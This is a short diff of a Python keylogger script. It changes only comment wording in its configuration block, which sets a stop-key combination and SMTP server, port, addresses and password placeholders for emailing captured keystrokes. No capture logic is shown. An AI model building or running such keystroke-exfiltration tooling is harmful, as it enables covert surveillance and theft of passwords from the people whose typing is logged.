@@ -9,8 +9,8 @@ import socket
 from win10toast import ToastNotifier
 
 EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
-PORT = 465                                  # Specify port number here (465 or 587 recommended)
-SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server here
+PORT = 465                                  # Specify port number (465 or 587 recommended)
+SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
 TO_ADDR = "your_email@domain.com"           # Specify recipient email address
 FROM_ADDR = "your_email@domain.com"         # Specify sender email address
 PASSWORD = "your_password"                  # Specify sender email account password
